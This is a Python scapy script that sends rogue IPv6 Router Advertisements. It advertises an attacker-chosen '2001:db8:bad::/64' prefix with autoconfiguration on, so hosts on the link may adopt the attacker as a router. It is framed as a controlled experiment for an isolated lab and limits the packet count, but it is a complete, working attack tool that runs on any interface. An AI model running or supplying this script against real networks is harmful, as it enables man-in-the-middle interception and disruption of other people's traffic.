
#!/usr/bin/env python3

import argparse
import ipaddress

from scapy.all import (
    Ether,
    IPv6,
    ICMPv6ND_RA,
    ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptSrcLLAddr,
    get_if_hwaddr,
    sendp,
)


def main():
    parser = argparse.ArgumentParser(
        description="Controlled rogue RA experiment for the isolated IPv6 lab"
    )

    parser.add_argument("--iface", required=True)
    parser.add_argument("--attacker-ip", default="fe80::66")
    parser.add_argument("--attacker-mac", default=None)
    parser.add_argument(
        "--evil-prefix",
        default="2001:db8:bad::/64"
    )
    parser.add_argument("--count", type=int, default=5)
    parser.add_argument("--interval", type=float, default=1.0)
    parser.add_argument("--router-lifetime", type=int, default=1800)

    args = parser.parse_args()

    if not 1 <= args.count <= 50:
        parser.error("--count must be between 1 and 50")

    if args.interval < 0.2:
        parser.error("--interval must be at least 0.2 seconds")

    try:
        attacker_ip = ipaddress.IPv6Address(args.attacker_ip)
        network = ipaddress.IPv6Network(args.evil_prefix, strict=False)
    except ValueError as exc:
        parser.error(str(exc))

    if not attacker_ip.is_link_local:
        parser.error("--attacker-ip must be link-local")

    if network.prefixlen != 64:
        parser.error("The advertised prefix must be /64")

    if not 0 <= args.router_lifetime <= 9000:
        parser.error("Invalid router lifetime")

    attacker_mac = args.attacker_mac or get_if_hwaddr(args.iface)

    packet = (
        Ether(
            src=attacker_mac,
            dst="33:33:00:00:00:01"
        )
        /
        IPv6(
            src=str(attacker_ip),
            dst="ff02::1",
            hlim=255
        )
        /
        ICMPv6ND_RA(
            chlim=64,
            M=0,
            O=1,
            routerlifetime=args.router_lifetime
        )
        /
        ICMPv6NDOptPrefixInfo(
            prefix=str(network.network_address),
            prefixlen=64,
            validlifetime=86400,
            preferredlifetime=14400,
            L=1,
            A=1
        )
        /
        ICMPv6NDOptSrcLLAddr(
            lladdr=attacker_mac
        )
    )

    print(f"Interface: {args.iface}")
    print(f"Attacker: {attacker_ip}")
    print(f"Malicious prefix: {network}")
    print(f"Sending {args.count} Router Advertisements")

    sendp(
        packet,
        iface=args.iface,
        count=args.count,
        inter=args.interval,
        verbose=False
    )

    print("Experiment completed.")


if __name__ == "__main__":
    main()
